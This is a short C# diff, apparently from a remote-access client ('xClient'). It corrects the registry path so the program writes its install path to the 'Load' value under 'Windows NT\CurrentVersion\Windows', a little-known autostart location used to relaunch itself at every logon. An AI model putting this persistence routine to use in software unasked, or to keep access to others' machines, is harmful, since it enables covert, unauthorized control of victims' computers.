@@ -323,7 +323,7 @@ namespace xClient.Core
                     {
                         using (
                             RegistryKey key =
-                                Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows NT\\CurrentVersion"))
+                                Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"))
                         {
                             if (key == null) throw new Exception();
                             key.SetValue(@"Load", InstallPath);
@@ -337,7 +337,7 @@ namespace xClient.Core
                         {
                             using (
                                 RegistryKey key =
-                                    Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion"))
+                                    Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"))
                             {
                                 if (key == null) throw new Exception();
                                 key.SetValue(@"Load", InstallPath);
@@ -415,7 +415,7 @@ namespace xClient.Core
                     {
                         using (
                             RegistryKey key =
-                                Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows NT\\CurrentVersion"))
+                                Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"))
                         {
                             if (key != null)
                             {
